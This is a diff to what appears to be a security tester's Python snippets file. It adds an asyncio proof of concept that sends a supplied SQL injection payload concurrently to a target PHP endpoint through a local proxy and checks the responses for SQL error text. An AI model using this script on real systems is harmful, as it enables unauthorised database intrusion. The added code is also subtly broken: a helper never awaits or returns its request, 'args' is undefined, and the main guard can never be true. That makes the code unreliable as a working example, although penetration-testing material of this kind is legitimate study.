@@ -1,4 +1,3 @@
-import asyncio
 import random
 import requests
 import logging
@@ -7,6 +6,8 @@ import time
 import json
 import sys
 import re
+import asyncio
+from aiohttp import ClientSession
 # from urllib3.exceptions import InsecureRequestWarning
 from bs4 import BeautifulSoup
 
@@ -291,6 +292,67 @@ async def async_main_http():
     https://github.com/codingforentrepreneurs/30-Days-of-Python/blob/master/tutorial-reference/Day%2027/ascrape_sema.py
     """
 
+# START of Asyncio POC code
+
+async def sqli_request(session, url, headers, data, proxies):
+    """
+    HTTP Request function to send SQLi
+    """
+    async with session.post(url, headers=headers, data=data, proxy=proxies) as response:
+        html_body = await response.text()
+        return {"statusCode": response.status, "headers": response.headers, "body": html_body, "cookies": response.cookies}
+
+
+async def sqli_request_sem(sem, session, url, headers, data, proxies):
+    """
+    Semaphore function
+    """
+    async with sem:
+        sqli_request(session, url, headers, data, proxies)
+
+
+async def sqli_main():
+    # Insert argparse and logging section HERE
+
+    # Variables
+    proxies = "http://127.0.0.1:8080"
+    headers = {'User-Agent': 'Mozilla', 'Content-Type': 'application/json'}
+    protocol = 'http://'
+    path = '/someApp/someFile.php'
+    data = "id="+args.injection + "&sort=True"
+    url = protocol+args.host+path
+
+    sem = asyncio.Semaphore(10)
+    async with ClientSession() as session:
+        tasks = []
+        for i in range(10):
+            tasks.append(
+                asyncio.create_task(
+                    sqli_request_sem(sem, session, url, headers, data, proxies)
+                )
+            )
+        responses = await asyncio.gather(*tasks)
+
+    for r in responses:
+        print('Status_code is: ', r.get("statusCode"))
+        print('Headers are: ', r.get("headers"))
+        print('Cookies are: ', r.get("cookies"))
+        # print('Text is: ', r.get("body"))
+
+        errors = re.search("There is an SQL Error", r.get("body"))
+        if errors:
+            print("There are errors!!! Take a closer look.")
+        else:
+            print("Nothing to see here.")
+
+
+if "__SQLI__name__" == "__main__":
+    start_time = time.perf_counter()
+    asyncio.run(sqli_main())
+    ellapsed_time = round(time.perf_counter() - start_time, 2)
+    print(f'Finished in {ellapsed_time} seconds(s)')
+
+# END of Asyncio POC code
 
 def regex_tips_python():
     """
